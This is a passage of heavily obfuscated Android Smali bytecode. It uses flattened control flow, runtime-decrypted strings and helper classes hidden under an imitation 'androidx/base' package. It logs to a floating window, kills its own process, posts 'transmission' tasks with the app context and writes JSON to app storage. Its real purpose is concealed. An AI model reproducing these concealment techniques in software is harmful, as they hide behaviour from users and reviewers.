    const-string v2, "\u06eb\u06e2\u06d9\u06d8\u06e0\u06e5\u06d8\u06e0\u06dc\u06e0\u06e4\u06e1\u06e6\u06e1\u06e6\u06d6\u06d8\u06d8\u06e8\u06e8\u06e8\u06dc\u06e7\u06d8\u06e4\u06eb\u06dc\u06d8\u06e7\u06e6\u06e4\u06e6\u06d6\u06e8\u06d7\u06db\u06d8\u06e7\u06e6\u06d7\u06e8\u06dc\u06e0\u06ec\u06db\u06dc\u06d8\u06e8\u06df\u06db\u06df\u06e5\u06e1"

    goto :goto_3f

    :sswitch_a8
    const-string v2, "\u06d6\u06e0\u06e1\u06e4\u06df\u06e0\u06e0\u06e4\u06d6\u06df\u06e5\u06ec\u06e1\u06e4\u06d8\u06d8\u06ec\u06dc\u06d8\u06dc\u06e2\u06db\u06d9\u06e6\u06db\u06e5\u06e2\u06d9\u06e8\u06d6"

    goto :goto_3f

    :sswitch_a9
    const v4, -0x509a366f

    const-string v2, "\u06da\u06d7\u06dc\u06eb\u06d8\u06d6\u06e7\u06df\u06df\u06df\u06d6\u06eb\u06e4\u06e0\u06e5\u06d8\u06e5\u06e7\u06da\u06e6\u06dc\u06dc\u06d8\u06df\u06da\u06e2\u06eb\u06d9\u06e5\u06d8\u06d8\u06ec\u06e0"

    :goto_41
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v4

    sparse-switch v10, :sswitch_data_2f

    goto :goto_41

    :sswitch_aa
    :try_start_20
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "pmCJneMKC4/If8zi1mC616BChJ3nHw==\n"

    const-string v5, "RPopcluFK2o=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "OZaMcjZYFQt0wr8FZXF/\n"

    const-string v5, "1ioAlY3Q86Y=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "9KRs+iw=\n"

    const-string v5, "kdYelV6dS7k=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {v2}, Landroid/os/Process;->killProcess(I)V
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_7

    goto/16 :goto_2b

    :sswitch_ab
    const-string v2, "\u06eb\u06e8\u06d8\u06d6\u06db\u06ec\u06ec\u06ec\u06d9\u06d8\u06d7\u06e2\u06da\u06d8\u06e5\u06d8\u06e5\u06db\u06e8\u06d8\u06d6\u06d6\u06d8\u06d7\u06e2\u06da\u06e0\u06d6\u06e8\u06d8\u06e1\u06e6\u06d9\u06e0\u06d9\u06e4\u06eb"

    goto :goto_41

    :sswitch_ac
    const v10, 0x7b3977cd

    const-string v2, "\u06e2\u06e8\u06df\u06db\u06d6\u06db\u06e5\u06e1\u06e5\u06e0\u06e8\u06e5\u06df\u06d9\u06e5\u06df\u06df\u06e5\u06d8\u06df\u06e1\u06e8\u06e1\u06d8\u06d8\u06da\u06da\u06e5\u06d8\u06df\u06e5\u06e6\u06d8"

    :goto_42
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v10

    sparse-switch v13, :sswitch_data_30

    goto :goto_42

    :sswitch_ad
    const-string v2, "\u06d9\u06da\u06e8\u06dc\u06eb\u06dc\u06d8\u06e4\u06d6\u06dc\u06dc\u06ec\u06eb\u06dc\u06d8\u06d8\u06e8\u06e4\u06d6\u06dc\u06e5\u06da\u06db\u06e6\u06ec\u06e5\u06e6\u06e8\u06d8\u06d8\u06da\u06d8\u06da\u06dc\u06e0\u06e1\u06e7\u06d6\u06d8\u06eb\u06e6\u06e6\u06d9\u06e7\u06e8\u06ec\u06e0\u06e6\u06d8\u06e0\u06e5\u06e7\u06d8"

    goto :goto_42

    :cond_16
    const-string v2, "\u06e2\u06d9\u06da\u06d8\u06e4\u06e8\u06e5\u06dc\u06e5\u06d8\u06e2\u06da\u06d7\u06d8\u06e6\u06e6\u06d9\u06d7\u06e4\u06d6\u06dc\u06e6\u06d8\u06d7\u06e6\u06d6\u06da\u06d7\u06e6\u06d8\u06ec\u06e5\u06dc\u06d7\u06e8\u06e7\u06d8\u06d8\u06e2\u06d6\u06d8"

    goto :goto_42

    :sswitch_ae
    const/4 v2, 0x1

    if-eq v11, v2, :cond_16

    const-string v2, "\u06eb\u06e5\u06e1\u06d8\u06e2\u06df\u06e6\u06d8\u06e6\u06d7\u06d7\u06d8\u06e4\u06d7\u06d7\u06e2\u06d8\u06ec\u06e4\u06db\u06e5\u06d6\u06ec\u06e6\u06e5\u06dc\u06d8\u06db\u06da\u06d6\u06d7\u06ec\u06e8\u06dc\u06e5\u06e4\u06eb\u06e6\u06d6\u06d8\u06e2\u06eb\u06e6\u06d8\u06eb\u06e8\u06dc"

    goto :goto_42

    :sswitch_af
    const-string v2, "\u06e2\u06e6\u06e1\u06e4\u06ec\u06eb\u06d8\u06e7\u06e4\u06e1\u06e0\u06d6\u06d6\u06d9\u06eb\u06e1\u06e7\u06db\u06df\u06d7\u06e7\u06d6\u06d8\u06eb\u06e6\u06d8\u06ec\u06da\u06e8\u06e7\u06e7\u06e1\u06e5\u06dc\u06e6\u06d8\u06e8\u06e7\u06d8\u06d8\u06d7\u06d9\u06e5\u06d8"

    goto :goto_41

    :sswitch_b0
    const-string v2, "\u06da\u06dc\u06da\u06e6\u06d7\u06dc\u06e8\u06e4\u06e2\u06e0\u06d8\u06e7\u06eb\u06e4\u06eb\u06df\u06eb\u06d6\u06d8\u06df\u06e2\u06e8\u06e8\u06e8\u06dc\u06d8\u06e8\u06df\u06eb\u06db\u06db\u06e5\u06d8"

    goto :goto_41

    :sswitch_b1
    const v4, 0x2f4a860a

    const-string v2, "\u06e2\u06e6\u06e5\u06d8\u06dc\u06eb\u06e7\u06e0\u06e8\u06dc\u06d7\u06e2\u06e4\u06e6\u06db\u06d6\u06d8\u06e2\u06d7\u06e1\u06dc\u06e1\u06da\u06e7\u06d8\u06e4\u06e2\u06df\u06d6\u06ec\u06d9\u06e1\u06d9\u06d9\u06e8\u06d6\u06d6\u06d8\u06da\u06d9\u06e6\u06e8\u06d8\u06e2"

    :goto_43
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v4

    sparse-switch v10, :sswitch_data_31

    goto :goto_43

    :sswitch_b2
    const-string v2, "\u06e2\u06e2\u06dc\u06e7\u06e2\u06e2\u06e2\u06e5\u06d6\u06d8\u06e5\u06e1\u06d9\u06e8\u06e0\u06df\u06e6\u06d7\u06d8\u06d8\u06d6\u06d6\u06dc\u06d8\u06da\u06d8\u06e2\u06ec\u06e1\u06e5\u06d8\u06da\u06d8\u06eb\u06e2\u06e6\u06ec\u06d8\u06e8\u06d6\u06d8\u06d9\u06df\u06dc\u06d8\u06d8\u06dc\u06e6\u06d8\u06d6\u06d7\u06dc\u06d8\u06d8\u06e5\u06d8\u06d8"

    goto :goto_43

    :sswitch_b3
    const-string v2, "\u06e6\u06e1\u06d9\u06db\u06e5\u06d6\u06d8\u06e0\u06dc\u06e8\u06d8\u06e0\u06db\u06db\u06e5\u06e8\u06e1\u06d8\u06e7\u06db\u06e1\u06da\u06e4\u06e6\u06d8\u06d9\u06e6\u06e1\u06d8\u06da\u06db\u06d9\u06da\u06db\u06df"

    goto :goto_43

    :sswitch_b4
    const v10, -0x6a262b21

    const-string v2, "\u06e1\u06da\u06e4\u06e8\u06e7\u06e5\u06d8\u06e0\u06e7\u06ec\u06d8\u06e7\u06d8\u06eb\u06d7\u06dc\u06eb\u06d7\u06e5\u06ec\u06dc\u06e7\u06dc\u06ec\u06df\u06e6\u06e8\u06d8\u06e6\u06da\u06d8\u06d8"

    :goto_44
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v10

    sparse-switch v13, :sswitch_data_32

    goto :goto_44

    :sswitch_b5
    const/4 v2, 0x2

    if-eq v11, v2, :cond_17

    const-string v2, "\u06d6\u06df\u06da\u06e1\u06e7\u06ec\u06e0\u06e8\u06e6\u06d8\u06d6\u06e8\u06d7\u06d9\u06eb\u06db\u06e4\u06e5\u06dc\u06d8\u06e8\u06d9\u06e8\u06d8\u06d6\u06db\u06da\u06da\u06d9\u06e4\u06d9\u06d7\u06e7\u06e7\u06eb\u06e6\u06e5\u06d6\u06d6\u06d8\u06da\u06e1\u06d9\u06eb\u06e7\u06df"

    goto :goto_44

    :cond_17
    const-string v2, "\u06e0\u06e7\u06d8\u06d8\u06dc\u06e1\u06d6\u06eb\u06e7\u06e5\u06d8\u06e2\u06ec\u06d8\u06d8\u06d7\u06e2\u06e6\u06db\u06df\u06e1\u06da\u06db\u06e1\u06d7\u06e8\u06e5\u06d8\u06e0\u06e6\u06e1\u06d8\u06ec\u06e8\u06d9\u06d9\u06df\u06dc\u06eb\u06eb\u06d8\u06d8\u06e8\u06d8\u06e0\u06eb\u06e0\u06ec\u06e4\u06d9\u06eb\u06ec\u06d9\u06e8\u06e6\u06d8\u06e5\u06da\u06d8\u06d8"

    goto :goto_44

    :sswitch_b6
    const-string v2, "\u06e7\u06eb\u06d6\u06d8\u06d7\u06d8\u06d7\u06d9\u06e5\u06d6\u06d8\u06e5\u06d6\u06df\u06e6\u06ec\u06e5\u06d6\u06e2\u06df\u06df\u06eb\u06e7\u06e5\u06db\u06db\u06e5\u06d8\u06e7\u06dc\u06e5\u06e7\u06df\u06d6\u06dc\u06dc\u06d6\u06e4"

    goto :goto_44

    :sswitch_b7
    const-string v2, "\u06dc\u06df\u06e7\u06d8\u06d9\u06d8\u06e0\u06e1\u06e0\u06d6\u06dc\u06e5\u06e5\u06e7\u06e4\u06e5\u06ec\u06e1\u06e0\u06e8\u06ec\u06e0\u06e5\u06d8\u06e7\u06d8\u06d6\u06d8\u06e8\u06e7\u06eb"

    goto :goto_43

    :sswitch_b8
    const v4, 0x6c90ba5e

    const-string v2, "\u06df\u06e8\u06e7\u06d8\u06dc\u06e6\u06e1\u06dc\u06db\u06db\u06eb\u06d8\u06d8\u06e7\u06e4\u06e6\u06ec\u06e8\u06e7\u06d7\u06e7\u06d6\u06d8\u06e6\u06e8\u06e2\u06d6\u06da\u06d6\u06df\u06d6\u06dc\u06da\u06db\u06d6\u06e4\u06e1\u06e7\u06d8"

    :goto_45
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v4

    sparse-switch v10, :sswitch_data_33

    goto :goto_45

    :sswitch_b9
    const-string v2, "\u06e1\u06d6\u06e7\u06d8\u06d6\u06e7\u06e4\u06e6\u06eb\u06e6\u06d8\u06e4\u06d6\u06ec\u06db\u06d6\u06eb\u06e2\u06eb\u06e6\u06e8\u06db\u06e6\u06d6\u06e1\u06e2\u06db\u06db\u06e1\u06d8\u06e2\u06e5\u06dc\u06d8\u06e0\u06eb\u06dc\u06d8\u06e2\u06e8\u06e0\u06db\u06e5\u06e0\u06df\u06dc\u06e5\u06e8\u06e4\u06e4\u06db\u06d6\u06d6\u06d8"

    goto :goto_45

    :sswitch_ba
    const-string v2, "\u06eb\u06d7\u06e6\u06d8\u06d9\u06e4\u06e1\u06d8\u06e5\u06eb\u06e1\u06d8\u06d8\u06dc\u06e6\u06d8\u06ec\u06ec\u06db\u06e2\u06e2\u06dc\u06d8\u06d8\u06e0\u06dc\u06e0\u06e5\u06d9\u06da\u06e2\u06d6\u06da\u06e7\u06db\u06e4\u06dc\u06d8\u06e7\u06dc\u06d7\u06e1\u06e6\u06d6\u06ec\u06ec\u06dc\u06d8\u06d7\u06d7\u06e1\u06d8\u06e7\u06e5\u06db\u06e7\u06e7\u06d8\u06dc\u06e8"

    goto :goto_45

    :sswitch_bb
    const v10, 0x6dd13270

    const-string v2, "\u06d8\u06d7\u06e6\u06e2\u06ec\u06e0\u06e7\u06eb\u06e0\u06dc\u06e0\u06d8\u06e1\u06d9\u06d7\u06eb\u06e0\u06da\u06d7\u06e1\u06d8\u06d6\u06e1\u06e7\u06d8\u06d9\u06dc\u06ec\u06e4\u06e4\u06e8\u06d8"

    :goto_46
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v10

    sparse-switch v13, :sswitch_data_34

    goto :goto_46

    :sswitch_bc
    const-string v2, "\u06df\u06e5\u06d7\u06dc\u06d6\u06dc\u06d8\u06e5\u06e2\u06e8\u06df\u06e5\u06e4\u06e8\u06e5\u06df\u06d9\u06d7\u06d8\u06d8\u06ec\u06d8\u06e1\u06e6\u06e7\u06dc\u06e8\u06d6\u06e4\u06e6\u06d9\u06e1"

    goto :goto_45

    :cond_18
    const-string v2, "\u06ec\u06df\u06d7\u06e5\u06ec\u06d7\u06e2\u06e8\u06da\u06da\u06dc\u06ec\u06e4\u06dc\u06e5\u06d8\u06e4\u06da\u06d9\u06e6\u06d8\u06e0\u06d9\u06eb\u06e8\u06d8\u06eb\u06e5\u06d6\u06d8\u06d6\u06df\u06ec\u06dc\u06ec\u06ec\u06e7\u06d9\u06d6\u06d8\u06df\u06d8\u06d9\u06d6\u06e7\u06d8\u06e7\u06e0\u06e6\u06d8\u06ec\u06e8\u06e5\u06d8\u06e7\u06e1\u06ec\u06e7\u06e1\u06e7"

    goto :goto_46

    :sswitch_bd
    const/4 v2, 0x3

    if-eq v11, v2, :cond_18

    const-string v2, "\u06ec\u06d8\u06df\u06eb\u06eb\u06e2\u06eb\u06ec\u06e2\u06dc\u06df\u06e6\u06d8\u06e8\u06e6\u06e2\u06ec\u06d6\u06e5\u06d8\u06eb\u06e1\u06d8\u06d9\u06e1\u06dc\u06e6\u06eb\u06e7\u06e6\u06d7\u06ec\u06e6\u06eb\u06e4\u06ec\u06ec\u06e1\u06d8\u06e0\u06e6\u06e5\u06d8\u06e0\u06e6\u06e0\u06dc\u06ec\u06da\u06da\u06dc\u06dc\u06d6\u06e6\u06df\u06e4\u06d9\u06e5\u06d8"

    goto :goto_46

    :sswitch_be
    const-string v2, "\u06df\u06eb\u06e0\u06df\u06db\u06dc\u06d6\u06ec\u06e8\u06eb\u06df\u06e1\u06d8\u06e2\u06df\u06db\u06df\u06ec\u06d6\u06e2\u06d6\u06e1\u06e5\u06e7\u06ec\u06dc\u06e6\u06e6\u06d8\u06d6\u06d8\u06df\u06da\u06e6\u06e7\u06d8\u06df\u06d9\u06d6\u06d7\u06e8\u06e7\u06d8\u06eb\u06d8\u06db\u06d7\u06e6\u06e8\u06d8\u06eb\u06e7\u06df"

    goto :goto_46

    :sswitch_bf
    :try_start_21
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "2jAc+tLIPDS0L1mF56KNbNwSEfrW3Q==\n"

    const-string v5, "OKq8FWpHHNE=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "YahreO8uxzw08mgNtDOYXjeiACbAcb8k\n"

    const-string v5, "jhTnnVOXIrs=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "jjPmDM4=\n"

    const-string v5, "60GUY7wNpoI=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v2, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, Landroidx/base/전송;

    const/4 v5, 0x3

    move-object/from16 v0, p3

    invoke-direct {v4, v5, v0, v12}, Landroidx/base/전송;-><init>(ILandroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v2, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v2, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, Landroidx/base/처리;

    const/4 v5, 0x0

    invoke-direct {v4, v5}, Landroidx/base/처리;-><init>(I)V

    const-wide/16 v6, 0x5dc

    invoke-virtual {v2, v4, v6, v7}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto/16 :goto_2b

    :sswitch_c0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "7rvdF6LXDDGApJhol729aeiZ0Bemwg==\n"

    const-string v10, "DCF9+BpYLNQ=\n"

    invoke-static {v4, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "AaLfCh6yiRxU+Nx/Ra/W\n"

    const-string v9, "7h5T76ILbJs=\n"

    invoke-static {v4, v9}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "xcdp8ZA=\n"

    const-string v9, "oLUbnuKn7FE=\n"

    invoke-static {v4, v9}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v2, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, Landroidx/base/전송;

    const/4 v9, 0x2

    move-object/from16 v0, p3

    invoke-direct {v4, v9, v0, v12}, Landroidx/base/전송;-><init>(ILandroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v2, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :sswitch_c1
    add-int/lit8 v2, v5, 0x1

    move v5, v2

    goto/16 :goto_30

    :sswitch_c2
    const-string v2, "\u06e7\u06d6\u06e1\u06e1\u06e6\u06e4\u06e7\u06ec\u06da\u06e4\u06e4\u06e2\u06e8\u06d8\u06d8\u06d9\u06ec\u06e6\u06d8\u06d7\u06e5\u06e2\u06e1\u06d6\u06e1\u06d9\u06e7\u06e4\u06da\u06e6\u06d8\u06e7\u06e1\u06e5\u06d6\u06d7\u06d6\u06db\u06e6\u06e8\u06d8\u06dc\u06e5\u06d8"

    goto/16 :goto_28

    :sswitch_c3
    const v7, -0x16e0e402

    const-string v2, "\u06da\u06e8\u06d6\u06df\u06da\u06dc\u06d8\u06d7\u06e0\u06e2\u06e0\u06ec\u06e5\u06d8\u06d9\u06e1\u06dc\u06d8\u06df\u06dc\u06dc\u06d8\u06e0\u06db\u06e1\u06d6\u06da\u06e1\u06d8\u06e1\u06e0\u06d9\u06e8\u06e8\u06dc\u06e4\u06e2\u06e6\u06d8\u06e6\u06e4\u06e7\u06d8\u06da\u06eb\u06df\u06d6\u06e2\u06d7\u06df\u06d7\u06e2\u06e5"

    :goto_47
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_35

    goto :goto_47

    :sswitch_c4
    if-eqz v5, :cond_19

    const-string v2, "\u06d7\u06e6\u06d7\u06da\u06e5\u06d7\u06d6\u06e1\u06e7\u06d8\u06e4\u06e4\u06e0\u06e5\u06e6\u06da\u06d9\u06e1\u06d9\u06e4\u06ec\u06e2\u06df\u06e0\u06ec\u06e6\u06e1\u06ec\u06da\u06e1\u06db\u06e8\u06e2\u06e7\u06da\u06d6\u06ec"

    goto :goto_47

    :cond_19
    const-string v2, "\u06e5\u06e0\u06e5\u06d8\u06da\u06d9\u06d9\u06e6\u06e8\u06e4\u06e6\u06e1\u06d8\u06d8\u06e4\u06e7\u06d7\u06e4\u06dc\u06e4\u06e4\u06ec\u06d8\u06e2\u06d9\u06d6\u06d8\u06d6\u06ec\u06e0\u06dc\u06d7\u06d7\u06db\u06dc\u06e5\u06df\u06e5\u06d8\u06db\u06e5\u06da\u06d7\u06d6\u06da\u06e6\u06e5\u06eb\u06db\u06e7\u06e8\u06eb\u06df\u06dc\u06df\u06d8\u06dc\u06d8"

    goto :goto_47

    :sswitch_c5
    const-string v2, "\u06d9\u06e6\u06e2\u06da\u06e5\u06e6\u06dc\u06ec\u06df\u06e4\u06d7\u06d8\u06e6\u06da\u06e1\u06d8\u06d9\u06d9\u06d9\u06d8\u06d7\u06e6\u06d8\u06d7\u06df\u06d6\u06d8\u06df\u06d7\u06d6\u06e6\u06d8\u06e1"

    goto :goto_47

    :sswitch_c6
    const-string v2, "\u06e2\u06da\u06e8\u06d8\u06dc\u06da\u06e7\u06d9\u06e5\u06e7\u06d8\u06eb\u06e7\u06eb\u06eb\u06d7\u06e8\u06d8\u06e7\u06d6\u06e5\u06e4\u06d6\u06d9\u06d8\u06e1\u06e8\u06d8\u06e0\u06dc\u06dc\u06e0\u06e2\u06df"

    goto/16 :goto_28

    :sswitch_c7
    new-instance v2, Ljava/io/File;

    invoke-virtual/range {p3 .. p3}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v4

    const-string v7, "MCyTX5A01zYmKYRVjwLTJg0jk1+TDpg/IS+c\n"

    const-string v8, "UkDyPPtrtlU=\n"

    invoke-static {v7, v8}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v2, v4, v7}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_7

    :try_start_22
    new-instance v4, Ljava/io/FileWriter;

    const/4 v7, 0x0

    invoke-direct {v4, v2, v7}, Ljava/io/FileWriter;-><init>(Ljava/io/File;Z)V
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_8

    const/4 v2, 0x2

    :try_start_23
    invoke-virtual {v5, v2}, Lorg/json/JSONArray;->toString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/io/Writer;->write(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/Writer;->flush()V
    :try_end_23
    .catchall {:try_start_23 .. :try_end_23} :catchall_0

    :try_start_24
    invoke-virtual {v4}, Ljava/io/Writer;->close()V
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_8

    :goto_48
    :try_start_25
    invoke-static {}, LKvrUY/RiiGL/Utils;->getCurrentActivity()Landroid/app/Activity;

    move-result-object v7

    const v4, -0x3f96072e

    const-string v2, "\u06e2\u06d6\u06d8\u06d8\u06d6\u06d7\u06dc\u06d9\u06e6\u06e1\u06ec\u06d6\u06e7\u06da\u06e2\u06eb\u06e6\u06d8\u06e5\u06d7\u06d7\u06d8\u06da\u06e1\u06d7\u06e2\u06d7\u06d7\u06e2\u06e0\u06e2\u06d9\u06e1\u06ec\u06d9\u06d6\u06df\u06db\u06d7\u06e1\u06d8\u06eb\u06dc\u06eb\u06df\u06e0\u06e1\u06d8\u06d6\u06eb\u06e1\u06ec\u06e1\u06d6\u06d8\u06dc\u06e4\u06df"

    :goto_49
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_7

    move-result v8

    xor-int/2addr v8, v4

    sparse-switch v8, :sswitch_data_36

    goto :goto_49

    :sswitch_c8
    const-string v2, "\u06e2\u06e7\u06e5\u06e7\u06e5\u06e4\u06ec\u06e5\u06e0\u06d7\u06ec\u06e0\u06e1\u06e5\u06dc\u06eb\u06d8\u06e4\u06df\u06e1\u06ec\u06d9\u06e0\u06eb\u06d7\u06e4\u06e0\u06dc\u06e1\u06d6\u06df\u06e4\u06e5\u06e4\u06db\u06eb\u06e2\u06e8\u06d8\u06eb\u06da\u06d8\u06d6\u06d6\u06da\u06da\u06ec\u06e7"

    goto :goto_49

    :catchall_0
    move-exception v2

    :try_start_26
    invoke-virtual {v4}, Ljava/io/Writer;->close()V
    :try_end_26
    .catchall {:try_start_26 .. :try_end_26} :catchall_1

    :goto_4a
    :try_start_27
    throw v2
    :try_end_27
    .catch Ljava/lang/Exception; {:try_start_27 .. :try_end_27} :catch_8

    :catch_8
    move-exception v2

    :try_start_28
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Sx07xi+g88U3Qyy6WqizrQYXQpcawqrS\n"

    const-string v8, "oqaqI78tFkg=\n"

    invoke-static {v7, v8}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "XfsV4Pg=\n"

    const-string v7, "OIlnj4qPuR0=\n"

    invoke-static {v4, v7}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_28
    .catch Ljava/lang/Exception; {:try_start_28 .. :try_end_28} :catch_7

    goto :goto_48

    :catchall_1
    move-exception v4

    :try_start_29
    invoke-virtual {v2, v4}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V
    :try_end_29
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_29} :catch_8

    goto :goto_4a

    :sswitch_c9
    :try_start_2a
    const-string v2, "\u06dc\u06db\u06e5\u06e4\u06e8\u06d6\u06e8\u06d9\u06e6\u06d8\u06df\u06e4\u06e4\u06d8\u06da\u06ec\u06e6\u06da\u06e5\u06d8\u06ec\u06e2\u06e7\u06e2\u06e4\u06d8\u06d8\u06e0\u06d8\u06e6\u06d6\u06e7\u06e0"

    goto :goto_49

    :sswitch_ca
    const v8, -0x5ebf9bd6

    const-string v2, "\u06d6\u06d8\u06e7\u06d8\u06e7\u06e4\u06e5\u06d7\u06d7\u06e5\u06e5\u06e1\u06dc\u06e6\u06e8\u06df\u06e2\u06e5\u06dc\u06df\u06e6\u06e0\u06d8\u06e4\u06e8\u06e1\u06da\u06da\u06d8\u06e2\u06e5\u06e0\u06db\u06d9\u06d6"

    :goto_4b
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v8

    sparse-switch v9, :sswitch_data_37

    goto :goto_4b

    :sswitch_cb
